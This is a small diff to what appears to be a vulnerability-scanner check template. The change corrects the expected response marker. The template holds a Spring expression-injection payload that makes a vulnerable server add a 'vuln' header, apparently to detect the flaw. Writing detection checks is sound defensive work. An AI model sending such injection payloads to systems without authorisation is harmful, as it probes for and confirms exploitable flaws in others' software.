@@ -7,7 +7,7 @@ metadata:
 
 define:
     payload="&_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(\"vuln\",\"True\").aaa=aaa"
-    answer="vuln=True"
+    answer="vuln: True"
 
 given request then
     send request called check:
